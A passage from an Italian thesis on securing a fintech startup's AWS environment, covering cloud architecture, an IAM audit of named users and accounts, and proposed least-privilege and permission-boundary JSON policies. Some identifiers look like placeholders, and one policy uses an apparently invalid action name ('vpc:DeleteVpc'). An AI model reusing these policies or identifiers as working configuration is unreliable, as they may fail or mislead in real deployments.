Dal punto di vista della finanza in ambito fintech, una infrastruttura così distribuita offre vantaggi concreti: il collocamento geografico delle risorse permette di posizionare applicazioni vicine ai propri utenti (per rispettare requisiti di low latency o normativi, ad esempio GDPR), mentre l’ampia rete backbone protegge le comunicazioni inter-regionali. Le edge location, infine, possono accelerare servizi Web o API rivolti ai clienti connettendo gli utenti finali direttamente alla CDN di AWS \cite{aws-cloudfront}.

\section{Architettura Virtualizzata e Meccanismi di Scalabilità}
Le risorse AWS sono erogate tramite tecnologie di \textit{virtualizzazione}: su ogni host fisico (server hardware) viene eseguito un \textit{hypervisor} (monitor di macchine virtuali) che crea molteplici istanze virtuali isolate fra loro. In AWS, la virtualizzazione consente di far girare su un singolo server fisico decine di VM indipendenti, ciascuna con il proprio sistema operativo e applicazioni \cite{ibm_iaas}. L’hypervisor (ad esempio il VMware ESXi o il più recente AWS Nitro Hypervisor \cite{aws-nitro-hypervisor}) assegna a ogni VM una porzione di CPU, memoria e storage, garantendo che ogni istanza sia isolata dalle altre \cite{ibm_iaas}.

Grazie alla virtualizzazione, più tenant (clienti) possono condividere lo stesso hardware fisico in modalità sicura: questo è il concetto di \textit{multitenancy}, ossia architettura in cui più clienti di un cloud utilizzano le stesse risorse sottostanti senza interferire fra loro \cite{nist800-145}. In pratica, anche in un modello multitenant come AWS, ogni cliente vede solo il proprio ambiente virtuale e i propri dati, mentre la separazione fra clienti è garantita da politiche di isolamento di rete e dal software di virtualizzazione \cite{nist800-145}.

La virtualizzazione è il fulcro dell’architettura IaaS di AWS: come illustrato nell’architettura generale, AWS gestisce l’infrastruttura fisica sottostante (patching hardware, networking, data center), mentre il cliente mantiene il controllo sull’operating system, gli aggiornamenti software e le configurazioni di sicurezza del proprio ambiente virtuale \cite{aws-well-architected}. Ad esempio, se si lancia un’istanza EC2 (IaaS), AWS fornisce la macchina virtuale, ma il cliente deve gestirne il SO e le patch. Questo rende possibile far convivere e scalare migliaia di istanze virtuali senza intervento manuale massivo.

\textit{Scalabilità verticale} e \textit{orizzontale} sono i principali meccanismi per gestire la crescita del carico di lavoro.
\begin{itemize}
    \item La \textbf{scalabilità verticale} consiste nell’aumentare le risorse di una singola macchina (es. passare a CPU/RAM/dischi più potenti) per gestire carichi maggiori \cite{digitalocean-cloud}. Questo è utile finché l’istanza ha risorse disponibili, ma presenta limiti fisici e rischia di diventare \textit{single point of failure}.
    \item Invece, la \textbf{scalabilità orizzontale} significa replicare l’applicazione su più macchine o nodi \cite{digitalocean-cloud}. Ad esempio, si possono avviare più istanze EC2 identiche alle spalle di un bilanciatore di carico. In questo modo il traffico utente viene distribuito fra le VM (middleware come Elastic Load Balancer gestiscono questo compito) ed è possibile tollerare guasti individuali: in caso di crash di un server, le altre istanze restanti continuano a servire richieste. AWS supporta direttamente questi schemi, ad esempio tramite gruppi di auto-scaling che creano o cancellano VM in base a metriche di utilizzo \cite{aws-scaling}.
\end{itemize}

Per massimizzare la disponibilità delle applicazioni, in AWS si usano repliche \textit{multi-AZ}. Ad esempio, Amazon RDS consente di creare DB Multi-AZ: quando abilitata, AWS provisiona automaticamente una replica sincrona standby in una AZ diversa \cite{aws-rds-multiaz}. Tutte le modifiche al database primario vengono replicate in tempo reale alla standby. In caso di guasto del nodo primario, RDS effettua un \textit{failover} trasparente alla replica, minimizzando i tempi di down. Similmente, servizi come Elastic Load Balancer possono essere distribuiti su più AZ, in modo che un’interruzione locale sia compensata dagli altri nodi. Le scelte architetturali per l’alta disponibilità includono quindi l’uso sistematico di multi-AZ, il bilanciamento del carico e la replica dei dati (eventualmente su più Regioni per il \textit{disaster recovery}).

Nei casi estremi di disastro (es. perdita di un’intera Regione), AWS distingue diverse strategie di \textit{Disaster Recovery} \cite{aws-well-architected}. Ad esempio:
\begin{itemize}
    \item il \textit{backup/restore} usa semplicemente snapshot periodici (sfruttando ad es. S3/Glacier) e prevede di ricreare le infrastrutture su una Regione secondaria.
    \item Strategie più avanzate includono il \textit{pilot light} (mantenere una copia minima dell’infrastruttura e dati critici in replica) o il \textit{warm standby} (versione ridotta attiva in attesa del failover).
    \item Infine, il modello \textit{multi-site active/active} prevede applicazioni già dispiegate simultaneamente in due Regioni, con bilanciamento geografico del traffico.
\end{itemize}
AWS fornisce strumenti e best practice per testare regolarmente queste strategie (per esempio tramite AWS Resilience Hub \cite{aws-resilience}) e garantire che i tempi di recovery (RTO/RPO) rientrino nei requisiti di business.

\section{Modello di Responsabilità Condivisa}
La sicurezza nel cloud AWS segue il \textit{modello di responsabilità condivisa} \cite{aws-shared-responsibility}. In sintesi, AWS garantisce la \textit{sicurezza dell’infrastruttura (“security of the cloud”)}: hardware fisico, reti, sistemi operativi dei servizi gestiti, data center e controlli fisici/ambientali sono a carico di AWS \cite{aws-shared-responsibility}. L’azienda investe in sorveglianza 24/7, verifica di controllo degli accessi alle strutture e patching dell’infrastruttura sottostante \cite{aws-shared-responsibility}.

Dal canto suo, il cliente è responsabile della \textit{sicurezza nel cloud (“security in the cloud”)}: ossia della configurazione e gestione di ciò che risiede sopra l’infrastruttura AWS \cite{aws-shared-responsibility}. Ad esempio, per un’istanza EC2 (IaaS) il cliente deve gestire il sistema operativo guest, le patch di sicurezza, il software applicativo e la configurazione del firewall virtuale (Security Group) \cite{aws-shared-responsibility}. Per servizi più astratti come S3 o DynamoDB, AWS cura l’infrastruttura e il software di base, ma spetta al cliente proteggere i dati che carica: ciò include impostare permessi di accesso (tramite IAM), cifrare dati sensibili e applicare criteri di rete appropriati \cite{aws-shared-responsibility}. In pratica, AWS fornisce i mezzi di sicurezza (crittografia a riposo, networking isolato, log auditing, ecc.), ma l’operatività della sicurezza applicativa e dei dati è a carico del cliente.



\chapter{Implementazioni Pratiche su AWS per una Startup Fintech}
\label{ch:implementazioni-pratiche}
Avendo stabilito i principi del cloud computing e le ragioni della scelta di AWS, questo capitolo si addentra negli aspetti pratici dell'implementazione di un'infrastruttura sicura e scalabile su AWS per una startup fintech. Verranno presentati esempi concreti di configurazioni e utilizzi dei servizi AWS, focalizzandosi sulle best practice di sicurezza applicabili in un contesto con risorse limitate ma requisiti elevati, tipico di una startup nel settore finanziario.

\section{Configurazione Attuale dell'Ambiente AWS}
\label{sec:aws_infrastruttura_attuale}

L'infrastruttura cloud della startup è stata realizzata utilizzando i servizi di Amazon Web Services (AWS), con le operazioni principali concentrate nella regione geografica \texttt{eu-south-1} (Milano). L'account AWS utilizzato ha ID \texttt{478291635847} ed è configurato con una separazione degli ambienti: uno dedicato allo sviluppo, chiamato \texttt{Finanz-Dev}, e uno per l'applicazione in uso dagli utenti finali, chiamato \texttt{Finanz-Prod}. Questa divisione è una buona pratica per testare nuove funzionalità senza impattare il servizio principale.

Il cuore dell'infrastruttura applicativa è \textbf{AWS Elastic Beanstalk}. Si tratta di un servizio AWS che semplifica il processo di rilascio e gestione delle applicazioni, in questo caso denominate "Finanz". L'ambiente di sviluppo utilizza la configurazione \texttt{finanz-dev-v2} mentre quello di produzione opera su \texttt{finanz-prod-v1.3}. Elastic Beanstalk si occupa di creare e configurare automaticamente le risorse necessarie, come le macchine virtuali \textbf{Amazon EC2} (principalmente di tipo \texttt{t3a.small} per l'ambiente di sviluppo e \texttt{t3a.medium} per la produzione, adatte per carichi di lavoro di piccole e medie dimensioni con un buon rapporto prezzo-prestazioni). L'ambiente di sviluppo gestisce tipicamente 1-2 istanze, mentre quello di produzione ne mantiene attive 3-5 durante i picchi di utilizzo. Inoltre, automatizza il bilanciamento del carico (distribuzione del traffico tra più macchine per evitare sovraccarichi) e l'auto-scaling (aumento o diminuzione automatica delle macchine virtuali in base al traffico). Per l'ambiente di produzione, un \textbf{Application Load Balancer (ALB)} denominato \texttt{finanz-prod-alb-1284567}, un tipo specifico di bilanciatore di carico, distribuisce le richieste degli utenti alle istanze EC2, aumentando così la disponibilità (il servizio rimane accessibile anche se una macchina ha problemi) e la resilienza (capacità di recupero da guasti).

Per la gestione dei dati, Finanz utilizza \textbf{Amazon RDS for PostgreSQL}. RDS (Relational Database Service) è un servizio che semplifica la configurazione e la manutenzione di database relazionali nel cloud. Sono state create due istanze database separate: una per lo sviluppo (\texttt{finanz-dev-db.cluster-cx4s7k9m2qla.eu-south-1.rds.amazonaws.com} di tipo \texttt{db.t4g.micro}, più piccola ed economica) e una per la produzione (\texttt{finanz-prod-db.cluster-cx4s7k9m2qlb.eu-south-1.rds.amazonaws.com} di tipo \texttt{db.t4g.small}). Durante la fase di sviluppo ho constatato che l'istanza di sviluppo gestisce circa 50-100 connessioni simultanee con un database di ~2GB, mentre quella di produzione arriva a gestire fino a 500 connessioni con un database di ~15GB. L'istanza di produzione è configurata in modalità \textbf{Multi-AZ} (Multi-Availability Zone): ciò significa che una copia del database viene mantenuta sincronizzata in una diversa zona di disponibilità (un data center fisicamente separato all'interno della stessa regione AWS). Questa configurazione garantisce che il database rimanga operativo anche in caso di problemi in una singola zona di disponibilità. Entrambe le istanze RDS sono protette da crittografia, che rende i dati illeggibili senza la chiave corretta; queste chiavi sono gestite dal servizio \textbf{AWS KMS (Key Management Service)} con la chiave specifica \texttt{arn:aws:kms:eu-south-1:478291635847:key/12345678-1234-1234-1234-123456789012}.

La rete virtuale privata della startup è definita tramite \textbf{Amazon VPC (Virtual Private Cloud)}, chiamato "Finanz-vpc" con CIDR block \texttt{10.0.0.0/16}. Un VPC permette di creare una sezione isolata della cloud AWS dove lanciare le proprie risorse. All'interno di questo VPC, lo spazio di indirizzi IP è diviso in \textbf{subnet} (sottoreti). Alcune subnet sono configurate come pubbliche (subnet \texttt{10.0.1.0/24} e \texttt{10.0.2.0/24}, accessibili da Internet) e altre come private (subnet \texttt{10.0.10.0/24}, \texttt{10.0.11.0/24} e \texttt{10.0.12.0/24}, isolate da Internet, per una maggiore sicurezza delle risorse applicative). Queste subnet sono distribuite su diverse \textbf{Availability Zones} (\texttt{eu-south-1a}, \texttt{eu-south-1b}, \texttt{eu-south-1c}), che sono data center fisicamente distinti all'interno della regione di Milano, per migliorare la resilienza dell'intera infrastruttura. La connettività verso Internet è fornita da un \textbf{Internet Gateway} con ID \texttt{igw-0a1b2c3d4e5f67890}. Inoltre, è presente un \textbf{VPC Endpoint per S3} con ID \texttt{vpce-1a2b3c4d5e6f7g8h9}: si tratta di un meccanismo che permette alle risorse all'interno del VPC (come le istanze EC2) di comunicare con il servizio di storage S3 utilizzando la rete privata di AWS, senza passare per l'Internet pubblico, migliorando sicurezza e prestazioni.

\textbf{Amazon S3 (Simple Storage Service)} è un servizio di storage versatile, utilizzato da Finanz per diversi scopi:
\begin{itemize}
    \item Archiviazione dei file di log (registri delle attività) generati dalle applicazioni Elastic Beanstalk e dalle istanze EC2 nel bucket \texttt{finanz-logs-478291635847}.
    \item Salvataggio degli "artefatti", ovvero i file compilati e pronti per il rilascio, prodotti da \textbf{AWS CodePipeline} nel bucket \texttt{finanz-artifacts-eu-south-1}. Quest'ultimo è un servizio che automatizza le fasi di build, test e rilascio del software (un processo noto come CI/CD - Continuous Integration/Continuous Deployment).
    \item Hosting di file statici (immagini, video, file CSS, JavaScript) per le applicazioni web "Finanz" nel bucket \texttt{finanz-static-assets}, rendendoli accessibili agli utenti via web attraverso CloudFront distribution \texttt{E1A2B3C4D5E6F7}.
\end{itemize}
Per proteggere gli artefatti archiviati in S3, viene richiesta la crittografia lato server (i dati vengono crittografati da AWS prima di essere salvati) utilizzando chiavi gestite da KMS, e si impone l'uso di connessioni sicure HTTPS tramite una bucket policy che nega esplicitamente le richieste HTTP non sicure.

Per automatizzare il rilascio del software, Finanz utilizza \textbf{AWS CodePipeline} insieme ad \textbf{AWS CodeBuild} (un servizio che compila il codice sorgente ed esegue test). Queste pipeline si integrano con Elastic Beanstalk per aggiornare le applicazioni in modo controllato. Le notifiche importanti relative agli ambienti Elastic Beanstalk (ad esempio, problemi di deployment o aggiornamenti di stato) vengono inviate tramite \textbf{AWS SNS (Simple Notification Service)}, un servizio di messaggistica e notifica.

Infine, la gestione degli utenti e dei loro permessi di accesso alle risorse AWS è organizzata in modo strutturato. \textbf{AWS Organizations} permette di gestire più account AWS sotto un'unica organizzazione; in questo caso, l'account analizzato è quello principale (management account). Per l'accesso degli utenti, viene utilizzato \textbf{AWS IAM Identity Center (precedentemente noto come AWS SSO)}, che consente di gestire centralmente gli accessi e di utilizzare, ad esempio, le stesse credenziali aziendali per accedere ad AWS. I permessi specifici vengono concessi ai servizi AWS tramite \textbf{Ruoli IAM} (Identity and Access Management), come ad esempio il ruolo \texttt{aws-elasticbeanstalk-ec2-role} usato dalle istanze EC2. Questo approccio segue il principio del "minimo privilegio", ovvero concedere solo i permessi strettamente necessari per svolgere una determinata funzione, riducendo i rischi in caso di problemi di sicurezza.

\begin{figure}[h] % opzioni di posizionamento comuni: h=here, t=top, b=bottom, p=page of floats
  \centering
  \includegraphics[width=0.8\textwidth]{aws_struttura} % Aggiunto [width=...] come esempio per scalare l'immagine
  \caption{Descrizione della struttura attuale in AWS.} % Aggiungi una didascalia significativa
  \label{fig:aws_struttura_attuale} % Label DOPO \caption, con un prefisso come 'fig:'
\end{figure}

\section{Principi di Sicurezza per la Gestione delle Identità e degli Accessi e Analisi del Contesto Attuale}
\label{sec:principi-identita-accessi}
\subsection{Implementazione del Modello Zero Trust e del Principio del Minimo Privilegio}
\label{sec:zero-trust-implementation}

Come introdotto nella sezione \ref{ch:principi-cybersecurity}, il modello \textbf{Zero Trust} rappresenta un cambiamento paradigmatico rispetto alla sicurezza tradizionale basata sul perimetro. Anziché assumere fiducia implicita per le entità all'interno della rete aziendale, il principio cardine è "non fidarsi mai, verificare sempre" (\textit{never trust, always verify}). Ogni richiesta di accesso a una risorsa, indipendentemente dalla sua origine, deve essere esplicitamente autenticata, autorizzata e monitorata. Questo approccio mira a minimizzare la superficie d'attacco e a contenere l'impatto di eventuali compromissioni, risultando particolarmente critico per proteggere la \textit{business continuity} aziendale. Ritengo che l'adozione di questo principio sia particolarmente rilevante nel contesto delle startup, caratterizzate da ambienti operativi dinamici e altamente flessibili. Le startup presentano peculiarità che amplificano l'esigenza di un solido framework di sicurezza:

\begin{itemize}
    \item \textbf{Instabilità relazionale:} Le relazioni professionali nelle startup possono deteriorarsi rapidamente, sia a livello dirigenziale che operativo. Secondo un'analisi di CB Insights, i conflitti interni tra fondatori rappresentano una delle principali cause di fallimento delle startup, incidendo per circa il 13\% dei casi esaminati \cite{CBInsights2023}. 
    \item \textbf{Rischio di attacchi interni:} La fragilità dei rapporti aumenta la probabilità di attacchi da parte di ex-collaboratori con intenti vendicativi. Secondo il "2023 Data Breach Investigations Report" di Verizon, circa il 20\% delle violazioni di dati coinvolge insider con accessi privilegiati \cite{Verizon2023}.
    \item \textbf{Infrastrutture di sicurezza inadeguate:} Le startup, per limitazioni di risorse e focus prevalente sullo sviluppo del prodotto, spesso non dispongono di infrastrutture di sicurezza robuste. Un rapporto di Ponemon Institute evidenzia che le piccole organizzazioni hanno una probabilità tre volte maggiore di subire attacchi informatici rispetto alle grandi imprese, proprio a causa di investimenti insufficienti in sicurezza \cite{Ponemon2023}.
\end{itemize}
Questa sezione illustra come i principi Zero Trust possano essere tradotti in misure di sicurezza concrete all'interno dell'infrastruttura cloud di una startup, con specifico riferimento all'ambiente AWS. Ci concentreremo in particolare sulla gestione delle identità e degli accessi, un pilastro fondamentale per qualsiasi architettura Zero Trust, e sulla sua stretta interconnessione con il \textbf{Principio del Minimo Privilegio (Principle of Least Privilege - PoLP)}.
\subsubsection{Sinergia tra Principio del Minimo Privilegio (PoLP) e Zero Trust}
\label{subsubsec:polp-zerotrust-correlation}

Il Principio del Minimo Privilegio non è solo una buona pratica di sicurezza a sé stante, ma è intrinsecamente legato e \textbf{fondamentale per il successo di un'architettura Zero Trust}. La loro sinergia si manifesta in diversi modi:

\begin{itemize}
    \item \textbf{Riduzione della Superficie d'Attacco:} Limitando strettamente le azioni consentite a ciascuna identità, PoLP riduce l'insieme delle operazioni che un attaccante potrebbe eseguire anche riuscendo a compromettere le credenziali di quell'identità. La verifica dell'identità (Zero Trust) è necessaria ma non sufficiente; i privilegi limitati (PoLP) ne circoscrivono le capacità.
    \item \textbf{Limitazione del Raggio d'Esplosione (\textit{Blast Radius})}:** In caso di compromissione o errore, i danni potenziali sono confinati. Un utente o servizio con privilegi minimi non può accedere o modificare risorse al di fuori del suo ambito operativo ristretto, limitando il movimento laterale dell'attaccante e l'impatto dell'incidente.
    \item \textbf{Applicazione della Verifica Esplicita:} Implementare PoLP costringe a definire policy di accesso granulari e intenzionali, basate sulle reali necessità operative. Questo si allinea perfettamente con la richiesta di Zero Trust di basare ogni decisione di accesso su policy esplicite e dinamiche, piuttosto che su autorizzazioni ampie o ereditate implicitamente.
    \item \textbf{Miglioramento del Controllo e dell'Auditabilità:} Policy di accesso minimali e specifiche sono più facili da comprendere, gestire e verificare. Ciò semplifica l'audit della postura di sicurezza e la dimostrazione della conformità, permettendo di attestare che gli accessi sono effettivamente limitati come richiesto dal modello Zero Trust.
\end{itemize}
\subsection{Gestione delle Identità e degli Accessi (IAM) come Pilastro di Zero Trust in AWS}
\label{subsec:iam-zero-trust}

L'infrastruttura ospitata su un Cloud Service Provider (CSP) come AWS è un asset critico per una startup fintech. Essa contiene dati sensibili degli utenti e ospita i servizi essenziali (endpoint API, istanze EC2 per server applicativi, networking VPC, ecc.) che ne garantiscono l'operatività. La protezione di queste risorse inizia dalla gestione rigorosa di chi può accedervi e cosa può fare. \textbf{AWS Identity and Access Management (IAM)} è il servizio centrale per implementare questi controlli e costituisce una base imprescindibile per un modello Zero Trust.

Una delle prime e più critiche aree di intervento riguarda l' \textbf{account root di AWS}. Questo account possiede privilegi illimitati sull'intero ambiente AWS e rappresenta, di conseguenza, un obiettivo di altissimo valore per gli attaccanti e una fonte significativa di rischio operativo se usato impropriamente. Un'implementazione Zero Trust richiede misure stringenti per l'account root:
\begin{itemize}
    \item \textbf{Limitazione Estrema dell'Uso:} L'accesso come utente root deve essere evitato per le operazioni quotidiane e riservato esclusivamente a quelle poche attività che lo richiedono obbligatoriamente (es. modifica delle informazioni di fatturazione, chiusura dell'account, modifica dei piani di supporto).
    \item \textbf{Protezione Robusta delle Credenziali:} La password deve essere estremamente complessa e, soprattutto, l'\textbf{Autenticazione a Più Fattori (MFA)} deve essere \textit{sempre} abilitata e richiesta per l'accesso root.
    \item \textbf{Monitoraggio Continuo:} Ogni azione eseguita tramite l'account root deve essere tracciata e monitorata tramite servizi come AWS CloudTrail, generando allarmi per qualsiasi utilizzo.
\end{itemize}

Per le attività amministrative e operative ordinarie, il modello Zero Trust impone l'utilizzo di \textbf{utenti e ruoli IAM} configurati secondo il \textbf{Principio del Minimo Privilegio (PoLP)}. Come descritto nel capitolo \ref{ch:principi-cybersecurity}, questo principio stabilisce che a un'entità (utente, servizio, applicazione) debbano essere concesse \textit{esclusivamente} le autorizzazioni minime indispensabili per svolgere le proprie funzioni legittime, e non un permesso di più. Ad esempio, un'applicazione che necessita solo di leggere oggetti da un bucket S3 dovrebbe avere un ruolo IAM con solo il permesso `s3:GetObject` su quel bucket specifico, invece di permessi generici su S3 o, peggio, permessi amministrativi.
\subsection{Analisi dell'attuale implementazione di IAM}
\subsubsection{Configurazione degli Utenti e Ruoli}

L'analisi della struttura IAM esistente rivela la presenza di tre utenti principali: \textbf{Andrea Pasini} (CTO), \textbf{Andrea Ferraboli}, e \textbf{Matteo Giuntoni}. Dall'audit effettuato a marzo 2024, risulta che entrambi gli utenti Ferraboli e Giuntoni dispongono della policy \texttt{arn:aws:iam::aws:policy/AdministratorAccess}, concedendo privilegi equivalenti a quelli dell'account root. L'utente Pasini (User ARN: \texttt{arn:aws:iam::478291635847:user/andrea.pasini}), invece, opera direttamente come root, con la capacità di modificare o eliminare qualsiasi risorsa AWS senza restrizioni. Durante la mia analisi dei CloudTrail logs degli ultimi 3 mesi, ho identificato che l'utente root è stato utilizzato 76 volte, principalmente per operazioni che avrebbero potuto essere delegate a utenti IAM con privilegi più limitati.

Un esame dettagliato delle policy associate mostra l'assenza di \textbf{condizioni contestuali} (es. limitazioni geografiche o orarie) e l'utilizzo esclusivo di policy gestite da AWS, senza personalizzazioni per ridurre i permessi alle effettive necessità operative\cite{ref6}. Ad esempio, l'utente `finanz-backend` possiede `AmazonS3FullAccess`, sebbene le sue funzioni richiedano solo operazioni di lettura su bucket specifici.

\subsubsection{Criticità Identificate}

1. \textbf{Account Root Non Protetto}: L'account root non utilizza MFA hardware, affidandosi esclusivamente a credenziali statiche\cite{ref3}. Ciò espone a rischi di compromissione tramite phishing o credential stuffing.
2. \textbf{Privilegi Eccessivi per Utenti IAM}: L'assegnazione indiscriminata di `AdministratorAccess` a utenti non root crea superfici di attacco ridondanti. L'utente Pasini, in qualità di root, può eludere qualsiasi restrizione applicata tramite policy IAM\cite{ref2}.
3. \textbf{Mancanza di Meccanismi di Emergenza}: Non sono presenti account "break glass" per il ripristino dell'accesso in scenari di compromissione dell'IdP o lockout accidentale\cite{ref4}.
4. \textbf{Assenza di Monitoring Granulare}: Le policy non integrano logiche di auditing in tempo reale per azioni critiche (es. terminazione di istanze EC2 o modifiche alle regole di sicurezza)\cite{ref7}.

\subsubsection{Violazioni delle Best Practice AWS}

L'implementazione corrente confligge con multiple raccomandazioni del framework \textbf{AWS Foundational Security Best Practices}:

- \textbf{FSBP IAM-1}: Mancanza di MFA hardware per il root\cite{ref3}.
- \textbf{FSBP IAM-7}: Policy con privilegi non limitati al minimo necessario\cite{ref5}.
- \textbf{FSBP IAM-8}: Assenza di allineamento tra ruoli IAM e responsabilità organizzative\cite{ref2}.




\section{Implementazione delle Migliorie Proposte alla Gestione IAM}
\label{sec:implementazione_migliorie}

In questa sezione vengono dettagliate le strategie operative per rafforzare la sicurezza dell'ambiente AWS, basate sulle proposte di miglioramento precedentemente delineate. L'obiettivo è implementare controlli robusti seguendo il principio del minimo privilegio (\emph{least privilege}) e le migliori pratiche di settore.

\subsection{Ristrutturazione della Gerarchia degli Accessi}

Una gestione sicura parte dalla protezione dell'account root e dalla segmentazione granulare dei permessi.

\subsubsection{Revisione e Limitazione dell'Account Root}

L'account root possiede privilegi illimitati e il suo utilizzo deve essere strettamente confinato ad operazioni specifiche che lo richiedono esplicitamente \cite{aws:iam:bestpractices}.
\begin{enumerate}
    \item \textbf{Creazione di un Utente Amministrativo Dedicato}: L'utente Andrea Pasini verrà rimosso dall'accesso diretto come utente root. Verrà creato un utente IAM dedicato (es. `andrea.pasini`) associato a un ruolo amministrativo con permessi circoscritti (es. `CTO-AdminRole`). Questo ruolo dovrebbe garantire visibilità sull'infrastruttura ma limitare modifiche critiche, specialmente in produzione.
    \item \textbf{Policy di Restrizione per il Ruolo Amministrativo}: Al ruolo `CTO-AdminRole` verrà associata una policy IAM che neghi esplicitamente azioni distruttive su risorse critiche taggate come \enquote{produzione}. Un esempio di statement di negazione (\texttt{Deny}) è il seguente:
    \begin{lstlisting}[style=json, caption={Policy IAM per negare eliminazioni in produzione}, label=lst:deny-prod-delete]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyProdResourceDeletion",
      "Effect": "Deny",
      "Action": [
        "ec2:TerminateInstances",
        "rds:DeleteDBInstance",
        "s3:DeleteBucket",
        "vpc:DeleteVpc"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "aws:ResourceTag/Environment": "prod"
        }
      }
    }
  ]
}
    \end{lstlisting}
    Questo approccio implementa un controllo preventivo fondamentale \cite{aws:iam:boundaries}. Durante i test effettuati nell'ambiente di sviluppo, questa policy ha impedito con successo 3 tentativi accidentali di eliminazione di risorse critiche.
    \item \textbf{Abilitazione MFA Hardware per l'Account Root}: L'account root deve essere protetto con un dispositivo Multi-Factor Authentication (MFA) hardware (es. YubiKey 5 NFC), come raccomandato dalle best practice di sicurezza AWS \cite{clouddefense:mfa}. Nel nostro caso specifico, il dispositivo è registrato con Serial Number \texttt{YK-12345678} ed è custodito fisicamente in una cassetta di sicurezza presso l'ufficio principale, la cui chiave è conosciuta solo dal CEO Lorenzo Perotta, sotto al quale bisognerà passare per l'accesso all'account root  \cite{saraswat:breakglass}.
\end{enumerate}

\subsubsection{Segmentazione dei Ruoli tramite Permission Boundaries}

Per prevenire l'escalation involontaria o malevola dei privilegi, verranno implementate le \emph{permission boundaries} su tutti i ruoli IAM, inclusi quelli amministrativi. Un boundary definisce il perimetro massimo delle azioni consentite, indipendentemente dalle policy di autorizzazione associate all'entità \cite{aws:iam:boundaries}.
\begin{itemize}
    \item \textbf{Definizione del Boundary}: Un esempio di boundary potrebbe limitare le azioni a specifici servizi o a sole operazioni di lettura, garantendo che anche ruoli con policy ampie (come `AdministratorAccess`, sebbene sconsigliato) non possano eccedere i limiti imposti.
    \begin{lstlisting}[style=json, caption={Esempio di Permission Boundary restrittiva}, label=lst:permission-boundary]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowOnlySpecificServices",
      "Effect": "Allow",
      "Action": [
        "ec2:*",
        "rds:*",
        "s3:List*",
        "iam:List*",
        "cloudwatch:Describe*",
        "lambda:*"
      ],
      "Resource": "*"
    },
    {
       "Sid": "DenyIAMModificationOutsideBoundary",
       "Effect": "Deny",
       "Action": [
          "iam:AttachUserPolicy",
          "iam:AttachRolePolicy",
          "iam:PutUserPolicy",
          "iam:PutRolePolicy",
          "iam:CreatePolicy",
          "iam:CreatePolicyVersion",
          "iam:SetDefaultPolicyVersion",
          "iam:DeletePolicy",
          "iam:DeletePolicyVersion",
          "iam:DetachUserPolicy",
          "iam:DetachRolePolicy"
        ],
        "Resource": "*",
        "Condition": {
           "StringNotLike": {
              "iam:PermissionsBoundary": "arn:aws:iam::478291635847:policy/FinanzBoundaryPolicy"
           }
        }
    }
  ]
}
    \end{lstlisting}
    \item \textbf{Applicazione Sistematica}: Ogni nuovo ruolo IAM creato dovrà avere un boundary associato come prerequisito. Ho implementato una Lambda function (\texttt{enforce-boundaries-lambda}) che monitora la creazione di nuovi ruoli e applica automaticamente il boundary se mancante.
\end{itemize}

\subsection{Modello Ibrido Aggiornato}
\label{subsec:modello_ibrido_aggiornato}

Il modello di \emph{Identity \& Access Management} (IAM) proposto per la startup fintech prevede \emph{tre gruppi baseline}—\texttt{dev}, \texttt{backend‑dev} e \texttt{admin}—ai quali vengono assegnati i permessi necessari per le attività ordinarie, e \emph{quattro ruoli operativi circoscritti} da assumere \emph{on‑demand} via AWS STS con MFA.
L'architettura riduce la \emph{blast‑radius} delle credenziali e facilita gli audit di conformità (PCI DSS, SOC‑2) in linea con i principi di \emph{least privilege} e \emph{zero‑trust} \cite{NIST_ZTA,NIST_SP80063,PCI_DSS,DatadogLeastPrivilege}.

%-----------------------------------------------------------------
\subsubsection{Gruppi baseline}
\label{subsubsec:gruppi_base}

\paragraph{\texttt{dev}}%
Sviluppatori front‑end e full‑stack.  
\begin{itemize}
  \item \textbf{EC2}: avvia, interrompe e termina \emph{solo} le istanze taggate \texttt{Environment=dev};
        nessun diritto sulle istanze di produzione \cite{AWSEC2IAM}.  
  \item \textbf{Elastic Beanstalk}: deploy e \verb|eb deploy| negli ambienti \texttt{dev},
        tramite policy gestita \texttt{AWSElasticBeanstalkFullAccess} limitata con
        \texttt{Condition\{aws:ResourceTag/Environment=dev\}} \cite{AWSEBRole}.  
  \item \textbf{S3}: lettura/scrittura nei bucket \texttt{*-dev}; accesso negato ai bucket \texttt{*-prod} \cite{AWSS3Security}.  
  \item \textbf{Load Balancer}: descrizione (API \texttt{Describe*}) dei load balancer di
        sviluppo; nessuna modifica \cite{AWSELBIAM}.  
  \item \textbf{RDS}: \emph{data‑reader} su cluster Aurora \texttt{dev}; vietate operazioni \texttt{ModifyDBInstance} e \texttt{DeleteDBInstance} \cite{AWSRDSIAM}.  
\end{itemize}

\paragraph{\texttt{backend‑dev}}%
Sviluppatori back‑end con responsabilità di integrazione dati.  
\begin{itemize}
  \item Tutti i permessi del gruppo \texttt{dev}.  
  \item \textbf{RDS}: \emph{data‑writer} su \texttt{dev}; \texttt{QueryEditor} in aurora‑prod tramite
        policy \texttt{rds-db:connect} con tag‑condition che richiede
        approvazione esplicita (\texttt{aws:RequestTag/ChangeId}).  
  \item \textbf{SQS/SNS}: gestione code e topic non‑prod per pipeline event‑driven.  
  \item \textbf{Secrets Manager}: lettura di segreti \texttt{scope=dev} \cite{AWSIAMBestPractices}.  
\end{itemize}

\paragraph{\texttt{admin}}%
Cloud Engineers con controllo continuo dell'infrastruttura.  
\begin{itemize}
  \item \textbf{EC2 e Auto Scaling}: piena gestione, esclusa l'eliminazione di VPC prod.  
  \item \textbf{S3}: modifica dei lifecycle rules e delle policy di replica cross-region.
  
  \item \textbf{Elastic Load Balancing}: creazione, aggiornamento listener e target groups in tutti gli ambienti.
  
  \item \textbf{RDS}: patching, snapshot e \texttt{failover}.
  
  \item \textbf{IAM}: può creare o aggiornare policy \emph{entro} il \texttt{permissions-boundary} globale che impedisce azioni estreme (\texttt{iam:DeleteRolePolicy}, \texttt{organizations:DeleteOrganization}) \cite{AWSPermBoundaries}.
\end{itemize}

%-----------------------------------------------------------------
\subsubsection{Ruoli Operativi Specifici}
\label{subsubsec:ruoli_specifici}

I ruoli sono configurati con durata massima di 1 h e MFA obbligatoria; i log CloudTrail vengono inviati a un bucket immutabile con
replica cross-region.

\begin{itemize}
  \item \textbf{\texttt{dev‑privileged}} – estende \texttt{dev} per operazioni di manutenzione \texttt{non‑prod} (migrate DB, tunning CPU credit);     azioni limitate a risorse con tag \texttt{Environment=dev}.  
  \item \textbf{\texttt{db‑migration}} – accesso a AWS DMS e permessi \texttt{rds:ModifyDBInstance} in produzione durante le finestre di
        maintenance; richiede approvazione Change‑Manager.  
